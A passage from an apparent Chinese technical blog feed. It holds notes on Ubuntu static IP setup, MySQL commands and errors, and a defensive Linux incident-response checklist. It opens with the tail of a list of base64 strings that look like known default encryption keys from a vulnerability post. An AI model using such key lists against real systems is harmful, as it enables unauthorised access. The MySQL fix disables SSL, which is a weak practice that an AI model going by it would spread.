&#x27;AztiX2RUqhc7dhOzl1Mj8Q==&#x27;, &#x27;FjbNm1avvGmWE9CY2HqV75==&#x27;, &#x27;QVN1bm5uJ3MgU3Vuc2l0ZQ==&#x27;,<br>&#x27;9Ami6v2G5Y+r5aPnE4OlBB==&#x27;, &#x27;2AvVidsaUSofSA3SDFAdog==&#x27;, &#x27;3AvVhdAgUs1FSA4SDFAdBg==&#x27;, &#x27;R29yZG9uV2ViAAAAAAAAAA==&#x27;, &#x27;wrjUh2ttBPQLnT4JVhriug==&#x27;,<br>&#x27;w793pPq5ZVBKkj8OhV4KaQ==&#x27;, &#x27;c2hvdWtlLXBsdXMuMjAxNg==&#x27;, &#x27;pyyX1c5x2f0LZZ7VKZXjKO==&#x27;, &#x27;duhfin37x6chw29jsne45m==&#x27;, &#x27;QUxQSEFNWVNPRlRCVUlMRA==&#x27;,<br>&#x27;YVd4dmRtVjViM1UlM0QIdn==&#x27;, &#x27;YnlhdnMAAAAAAAAAAAAAAA==&#x27;, &#x27;YystomRZLMUjiK0Q1+LFdw==&#x27;, &#x27;2AvVhdsgUs0FSA3SDFAder==&#x27;,<br>&#x27;A+kWR7o9O0/G/W6aOGesRA==&#x27;,<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>solr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>solr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu_static_ip</title>
    <link href="/2024/03/14/network/ip/ubuntu_static_ip/"/>
    <url>/2024/03/14/network/ip/ubuntu_static_ip/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Ubuntu20.4</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>1、备份 &#x2F;etc&#x2F;netplan 下配置文件</p><p>cp &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml.bak</p><p>2、修改 &#x2F;etc&#x2F;netplan 下配置文件</p><p>yaml 文件，需要注意空格缩进</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br><span class="hljs-attr">network:</span><br>  <span class="hljs-attr">version:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">renderer:</span> <span class="hljs-string">NetworkManager</span><br>  <span class="hljs-attr">ethernets:</span><br>    <span class="hljs-attr">ens33:</span><br>      <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">addresses:</span> <br>          <span class="hljs-bullet">-</span> <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.223</span><span class="hljs-string">/24</span><br>      <span class="hljs-attr">routes:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">to:</span> <span class="hljs-string">default</span><br>            <span class="hljs-attr">via:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.1</span><br><span class="hljs-string">ubuntu@ubuntu-virtual-machine:/</span><br></code></pre></td></tr></table></figure><p>3、应用当前配置</p><p>sudo netplan apply</p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h3 id="配置后没有网络"><a href="#配置后没有网络" class="headerlink" title="配置后没有网络"></a>配置后没有网络</h3><h4 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h4><p>ip  a  对应网卡没有IP信息</p><p>图形界面也没有网络信息，右上角开关按钮-&gt;Settings-&gt;Network 只有 VPN 和 Network Proxy ，没有 Wired</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>停止网络服务，删除缓存信息，启动网络服务</p><p>service NetworkManager stop</p><p>rm -rf &#x2F;var&#x2F;lib&#x2F;NetworkManager&#x2F;NetworkManager.state</p><p>service NetworkManager start </p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>ip</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>ubuntu</tag>
      
      <tag>ip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql_op</title>
    <link href="/2024/03/13/db/mysql/mysql_op/"/>
    <url>/2024/03/13/db/mysql/mysql_op/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录日常mysql数据的操作命令</p><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="启动停止"><a href="#启动停止" class="headerlink" title="启动停止"></a>启动停止</h2><p>net start mysql</p><p>net stop mysql</p>]]></content>
    
    
    <categories>
      
      <category>db</category>
      
      <category>mysql</category>
      
      <category>mysql_op</category>
      
    </categories>
    
    
    <tags>
      
      <tag>db</tag>
      
      <tag>mysql</tag>
      
      <tag>mysql_op</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql_error</title>
    <link href="/2024/03/13/db/mysql/mysql_error/"/>
    <url>/2024/03/13/db/mysql/mysql_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对日常工作过程中遇到的mysql报错问题及解决方案汇总总结</p><h1 id="登录错误"><a href="#登录错误" class="headerlink" title="登录错误"></a>登录错误</h1><h2 id="unsupported-protocol"><a href="#unsupported-protocol" class="headerlink" title="unsupported protocol"></a>unsupported protocol</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>终端中使用 mysql -h host -u name -p 命令连接mysql数据库，提示协议不支持</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">ERROR </span>2026 (HY000): SSL connection error: error:0A000102:SSL routines::unsupported protocol<br></code></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>增加–ssl-mode参数，忽略ssl认证</p><p>mysql -h host -u user -p –ssl-mode&#x3D;DISABLED</p><p>官方文档：</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/connection-options.html#option_general_ssl-mode">https://dev.mysql.com/doc/refman/8.0/en/connection-options.html#option_general_ssl-mode</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[1] ysql 客户端SSL错误2026 (HY000) tmaczt 2022-05-10 20:19:05</p><p>链接：<a href="https://blog.csdn.net/tmaczt/article/details/124696188">https://blog.csdn.net/tmaczt/article/details/124696188</a></p>]]></content>
    
    
    <categories>
      
      <category>db</category>
      
      <category>mysql</category>
      
      <category>mysql_error</category>
      
    </categories>
    
    
    <tags>
      
      <tag>db</tag>
      
      <tag>mysql</tag>
      
      <tag>mysql_error</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sec_response</title>
    <link href="/2024/03/12/security/secresponse/sec_response/"/>
    <url>/2024/03/12/security/secresponse/sec_response/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><h3 id="主机信息-hostnamectl"><a href="#主机信息-hostnamectl" class="headerlink" title="主机信息 hostnamectl"></a>主机信息 hostnamectl</h3><p>Static hostname ：主机名，来自&#x2F;etc&#x2F;hostname</p><p>Machine ID ：设备唯一标识</p><p>Virtualization：kvm 虚拟化，可以用来标记是否是虚拟机，物理机不存在该数据</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:/tmp/test# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-attribute">hostname</span>: aliyun#@##@<br>       Icon <span class="hljs-attribute">name</span>: computer-vm<br>         <span class="hljs-attribute">Chassis</span>: vm<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h3 id="系统时间-date"><a href="#系统时间-date" class="headerlink" title="系统时间 date"></a>系统时间 date</h3><p>确认当前系统时间是否正确，为文件时间属性判断提供依据</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># date</span><br><span class="hljs-title class_">Wed</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span> <span class="hljs-title class_">AM</span> <span class="hljs-title class_">CST</span> <span class="hljs-number">2024</span><br></code></pre></td></tr></table></figure><h3 id="系统开机运行时间"><a href="#系统开机运行时间" class="headerlink" title="系统开机运行时间"></a>系统开机运行时间</h3><h4 id="who-b-开机时间"><a href="#who-b-开机时间" class="headerlink" title="who -b 开机时间"></a>who -b 开机时间</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># who -b</span><br>         system boot  <span class="hljs-number">2023</span><span class="hljs-number">-07</span><span class="hljs-number">-10</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="uptime-p-运行时长"><a href="#uptime-p-运行时长" class="headerlink" title="uptime -p 运行时长"></a>uptime -p 运行时长</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># uptime -p</span><br>up <span class="hljs-number">35</span> weeks, <span class="hljs-number">2</span> days, <span class="hljs-number">3</span> minutes<br></code></pre></td></tr></table></figure><h3 id="系统版本信息"><a href="#系统版本信息" class="headerlink" title="系统版本信息"></a>系统版本信息</h3><h4 id="lsb-release-a"><a href="#lsb-release-a" class="headerlink" title="lsb_release -a"></a><strong>lsb_release -a</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# lsb_release<br><span class="hljs-attribute">LSB</span> Version:core-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch:security-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# lsb_release -a<br><span class="hljs-attribute">LSB</span> Version:core-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch:security-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch<br><span class="hljs-attribute">Distributor</span> ID:Ubuntu<br><span class="hljs-attribute">Description</span>:Ubuntu <span class="hljs-number">22</span>.<span class="hljs-number">04</span>.<span class="hljs-number">2</span> LTS<br><span class="hljs-attribute">Release</span>:<span class="hljs-number">22</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">Codename</span>:jammy<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">(base)</span> [<span class="hljs-string">root@aliyun-39_106_2_51</span> <span class="hljs-string">~</span>]<span class="hljs-comment"># lsb_release -a</span><br><span class="hljs-attr">LSB Version:</span><span class="hljs-string">:core-4.1-amd64:core-4.1-noarch</span><br><span class="hljs-attr">Distributor ID:</span><span class="hljs-string">CentOS</span><br><span class="hljs-attr">Description:</span><span class="hljs-string">CentOS</span> <span class="hljs-string">Linux</span> <span class="hljs-string">release</span> <span class="hljs-number">7.8</span><span class="hljs-number">.2003</span> <span class="hljs-string">(Core)</span><br><span class="hljs-attr">Release:</span><span class="hljs-number">7.8</span><span class="hljs-number">.2003</span><br><span class="hljs-attr">Codename:</span><span class="hljs-string">Core</span><br></code></pre></td></tr></table></figure><h5 id="CentOS系列"><a href="#CentOS系列" class="headerlink" title="CentOS系列"></a>CentOS系列</h5><p><strong>cat &#x2F;etc&#x2F;redhat-release</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">(base) [root@<span class="hljs-number">110</span> cron.d]<span class="hljs-comment"># cat /etc/redhat-release</span><br>CentOS Linux release <span class="hljs-number">7.9</span>.<span class="hljs-number">2009</span> (Core)<br><br>centos6也可以查看 /etc/issue<br>[root@rdimtools1.ops.xlzbb1 /tmp]<span class="hljs-comment"># cat /etc/issue</span><br>CentOS release <span class="hljs-number">6.5</span> (Final)<br>Kernel <span class="hljs-string">\r</span> <span class="hljs-literal">on</span> an <span class="hljs-string">\m</span><br></code></pre></td></tr></table></figure><h3 id="内核版本-uname-a"><a href="#内核版本-uname-a" class="headerlink" title="内核版本 uname -a"></a>内核版本 uname -a</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">ubuntu<span class="hljs-title">@VM-8-5-ubuntu</span>:~$ uname -a<br>Linux VM<span class="hljs-number">-8</span><span class="hljs-number">-5</span>-ubuntu <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span><span class="hljs-number">-77</span>-generic <span class="hljs-variable">#86</span>-Ubuntu SMP Thu Jun <span class="hljs-number">17</span> <span class="hljs-number">02</span>:<span class="hljs-number">35</span>:<span class="hljs-number">03</span> UTC <span class="hljs-number">2021</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br><br>(base) [root<span class="hljs-title">@110</span> cron.d]# uname -a<br>Linux <span class="hljs-number">110</span> <span class="hljs-number">3.10</span>.<span class="hljs-number">0</span><span class="hljs-number">-693.2</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">7</span>.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-variable">#1</span> SMP Tue Sep <span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">26</span>:<span class="hljs-number">13</span> UTC <span class="hljs-number">2017</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br><br>[root<span class="hljs-title">@rdimtools1.ops.xlzbb1</span> /tmp]# uname -a<br>Linux rdimtools<span class="hljs-number">1</span>.ops.xlzbb<span class="hljs-number">1</span>.sinanode.com <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span><span class="hljs-number">-431.11</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">6</span>.toa.<span class="hljs-number">2</span>.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-variable">#1</span> SMP Wed Apr <span class="hljs-number">9</span> <span class="hljs-number">15</span>:<span class="hljs-number">55</span>:<span class="hljs-number">33</span> CST <span class="hljs-number">2014</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br></code></pre></td></tr></table></figure><p>结果解释，如果只需要看内核版本，直接uname -r即可：</p><p>Linux 110 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux</p><table><thead><tr><th>内核名称(-s)</th><th>主机名(-n)</th><th>内核(-r)</th><th>内核版本(-v)</th><th>硬件32位&#x2F;64位(-m)</th><th>处理器类型(-p)</th><th>硬件平台(-i)</th><th>操作系统(-o)</th></tr></thead><tbody><tr><td>Linux</td><td>110</td><td>3.10.0-693.2.2.el7.x86_64</td><td>#1 SMP Tue Sep 12 22:26:13 UTC 2017</td><td>x86_64</td><td>x86_64</td><td>x86_64</td><td>GNU&#x2F;Linux</td></tr></tbody></table><h3 id="主机名-hostname"><a href="#主机名-hostname" class="headerlink" title="主机名 hostname"></a>主机名 hostname</h3><p>cenots6：读取的是 &#x2F;etc&#x2F;sysconfig&#x2F;network 中的配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@rdimtools1.ops.xlzbb1 /tmp]</span><span class="hljs-comment"># cat /etc/sysconfig/network</span><br><span class="hljs-attr">NETWORKING</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">HOSTNAME</span>=rdimtools1.ops.xlzbb1.node.com<br></code></pre></td></tr></table></figure><p>centos7,8&#x2F;ubuntu：读取的是 &#x2F;etc&#x2F;hostname中的值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> cron.d]<span class="hljs-meta"># cat /etc/hostname</span><br><span class="hljs-number">110</span><br></code></pre></td></tr></table></figure><h2 id="止损"><a href="#止损" class="headerlink" title="止损"></a>止损</h2><h3 id="排查异常进程"><a href="#排查异常进程" class="headerlink" title="排查异常进程"></a>排查异常进程</h3><h4 id="检查高CPU进程"><a href="#检查高CPU进程" class="headerlink" title="检查高CPU进程"></a>检查高CPU进程</h4><h5 id="top-c-o-CPU"><a href="#top-c-o-CPU" class="headerlink" title="top -c -o +%CPU"></a>top -c -o +%CPU</h5><p>以CPU占比倒序</p><h5 id="ps-eo-pid-ppid-cpu-mem-cmd-–sort-cpu-head-n-5"><a href="#ps-eo-pid-ppid-cpu-mem-cmd-–sort-cpu-head-n-5" class="headerlink" title="ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%cpu | head -n 5"></a><strong>ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%cpu | head -n 5</strong></h5><p>ps查询进程，显示pid，ppid，cpu占比，内存占比，进程信息，以cpu占比倒序，只显示top5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -eo pid,ppid,%cpu,%mem,cmd --sort=-%cpu | head -n <span class="hljs-number">5</span><br>    <span class="hljs-attribute">PID</span>    PPID %CPU %MEM CMD<br> <span class="hljs-attribute">442637</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">7</span>  <span class="hljs-number">1</span>.<span class="hljs-number">5</span> /usr/local/aegis/aegis_client/aegis_11_83/AliYunDunMonitor<br> <span class="hljs-attribute">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">5</span> <span class="hljs-number">38</span>.<span class="hljs-number">8</span> /usr/sbin/mysqld<br>     <span class="hljs-attribute">92</span>       <span class="hljs-number">2</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span><span class="hljs-meta"> [kswapd0]</span><br> <span class="hljs-attribute">442626</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span>  <span class="hljs-number">0</span>.<span class="hljs-number">7</span> /usr/local/aegis/aegis_client/aegis_11_83/AliYunDun<br></code></pre></td></tr></table></figure><h4 id="检查高内存进程"><a href="#检查高内存进程" class="headerlink" title="检查高内存进程"></a>检查高内存进程</h4><h5 id="top-c-o-MEM"><a href="#top-c-o-MEM" class="headerlink" title="top -c -o +%MEM"></a>top -c -o +%MEM</h5><p>以内存占比倒序</p><h5 id="ps-eo-pid-ppid-cpu-mem-cmd-–sort-mem-head-n-5"><a href="#ps-eo-pid-ppid-cpu-mem-cmd-–sort-mem-head-n-5" class="headerlink" title="ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%mem | head -n 5"></a>ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%mem | head -n 5</h5><p>ps查询进程，显示pid，ppid，cpu占比，内存占比，进程信息，以内存占比倒序，只显示top5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -eo pid,ppid,%cpu,%mem,cmd --sort=-%mem | head -n <span class="hljs-number">5</span><br>    <span class="hljs-attribute">PID</span>    PPID %CPU %MEM CMD<br> <span class="hljs-attribute">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">5</span> <span class="hljs-number">38</span>.<span class="hljs-number">8</span> /usr/sbin/mysqld<br> <span class="hljs-attribute">577393</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">2</span>.<span class="hljs-number">9</span> /sbin/multipathd -d -s<br>  <span class="hljs-attribute">82956</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">2</span>  <span class="hljs-number">2</span>.<span class="hljs-number">3</span> /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock<br> <span class="hljs-attribute">577430</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">2</span>  <span class="hljs-number">1</span>.<span class="hljs-number">5</span> /usr/bin/containerd<br></code></pre></td></tr></table></figure><h4 id="检查高流量进程"><a href="#检查高流量进程" class="headerlink" title="检查高流量进程"></a>检查高流量进程</h4><p>需要额外命令 nethogs，可能更改某些文件时间属性，影响通过文件时间判断</p><h5 id="centos命令安装"><a href="#centos命令安装" class="headerlink" title="centos命令安装"></a>centos命令安装</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> epel-release <br>yum -y <span class="hljs-keyword">install</span> nethogs<br></code></pre></td></tr></table></figure><h5 id="ubuntu命令安装"><a href="#ubuntu命令安装" class="headerlink" title="ubuntu命令安装"></a>ubuntu命令安装</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> nethogs<br></code></pre></td></tr></table></figure><h5 id="进程检查"><a href="#进程检查" class="headerlink" title="进程检查"></a>进程检查</h5><p>管理员权限执行 nethogs，默认会以实时流量进行降序刷新</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">NetHogs version <span class="hljs-number">0.8.6-3</span><br><br>    PID USER     PROGRAM                                                                                            DEV         SENT      RECEIVED<br> <span class="hljs-number">676984</span> root     sshd: root@pts/<span class="hljs-number">0</span>                                                                                   eth0        <span class="hljs-number">0</span>.<span class="hljs-number">321</span>       <span class="hljs-number">0</span>.<span class="hljs-number">067</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">44765-89.248</span>.<span class="hljs-number">165.97:56284</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">011</span>       <span class="hljs-number">0</span>.<span class="hljs-number">023</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">8066-162.216</span>.<span class="hljs-number">149.193:50532</span>                                                                       <span class="hljs-number">0</span>.<span class="hljs-number">011</span>       <span class="hljs-number">0</span>.<span class="hljs-number">012</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">6000-205.210</span>.<span class="hljs-number">31.156:50132</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">3306-78.128</span>.<span class="hljs-number">114.102:50289</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">35487-31.6</span>.<span class="hljs-number">65.59:23619</span>                                                                           <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">55182-100.100</span>.<span class="hljs-number">154.78:80</span>                                                                          <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br> <span class="hljs-number">671886</span> root     /usr/local/aegis/aegis_client/aegis_11_91/AliYunDun                                                eth0        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     unknown TCP                                                                                                    <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br><br></code></pre></td></tr></table></figure><h4 id="确认进程id-pid"><a href="#确认进程id-pid" class="headerlink" title="确认进程id(pid)"></a>确认进程id(pid)</h4><h5 id="pidof-精确匹配-已知进程全名"><a href="#pidof-精确匹配-已知进程全名" class="headerlink" title="pidof-精确匹配-已知进程全名"></a>pidof-精确匹配-已知进程全名</h5><p>pidof “process name”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pidof <span class="hljs-string">&quot;/usr/sbin/mysqld&quot;</span></span><br><span class="hljs-number">659535</span><br>root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pidof <span class="hljs-string">&quot;mysqld&quot;</span></span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><h5 id="ps-pgrep-模糊匹配-已知进程部分名称"><a 